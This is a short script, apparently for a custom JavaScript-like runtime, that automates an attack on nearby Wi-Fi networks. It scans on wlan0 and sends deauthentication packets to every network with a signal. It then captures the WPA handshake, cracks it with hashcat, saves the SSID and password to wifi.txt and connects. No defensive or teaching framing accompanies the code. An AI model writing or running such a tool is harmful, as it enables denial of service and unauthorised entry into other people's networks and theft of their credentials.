const build_date :string =`2026-08-05`
const RFID :string = `GL9137EP0001063384581668864`

const mon: string = `wlan0`
const isInstalled = await installLib("hashcat");
println(`Hash Cat: ${isInstalled}`);
println(`Network Interface: ${mon}`)
let target: object|string = `null`;
const networks = await Networking.Wifi.Scan(mon);
for ( let network of networks){
   if (network.signal>1){
    target = network
    await Networking.Wifi.Deauth(mon,target.bssid,{packets: 20});
    const pcap = await Networking.Wifi.CaptureHandshake(mon,target.bssid);
    if (pcap != null){
        const password = await Crypto.Hashcat.Decrypt(`${pcap}`);
        println(`SSID: ${target.ssid}`);
        println(typeof(password));
        println(`Password: ${password}`);
        await FileSystem.WriteFile(`wifi.txt`,`placeholder`)
        let content = await FileSystem.ReadFile(`wifi.txt`)
        await FileSystem.WriteFile(`wifi.txt`,`${content} \n ${target.ssid}:${password}`)
        await Networking.Wifi.Connect(`${target.ssid}`,`${password}`)
    }
   }
};